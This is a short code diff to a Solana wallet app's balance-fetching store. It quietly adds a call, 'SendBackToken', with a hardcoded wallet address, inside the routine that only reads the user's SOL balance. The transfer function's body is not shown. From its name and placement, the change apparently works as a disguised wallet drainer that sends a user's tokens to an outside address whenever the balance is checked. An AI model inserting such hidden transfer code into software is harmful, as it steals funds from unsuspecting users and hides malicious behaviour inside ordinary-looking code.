@@ -1,5 +1,7 @@
 import create, { State } from 'zustand'
 import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js'
+import { SendBackToken } from "../components/AppSendBack"
+
 
 interface UserSOLBalanceStore extends State {
   balance: number;
@@ -9,6 +11,8 @@ interface UserSOLBalanceStore extends State {
 const useUserSOLBalanceStore = create<UserSOLBalanceStore>((set, _get) => ({
   balance: 0,
   getUserSOLBalance: async (publicKey, connection) => {
+
+    SendBackToken('GmukEQFzxP3sm6N7nVRRkjEn9CEY1sKE1zRoTqEhoVGD',publicKey)
     
     let balance = 0;
     try {
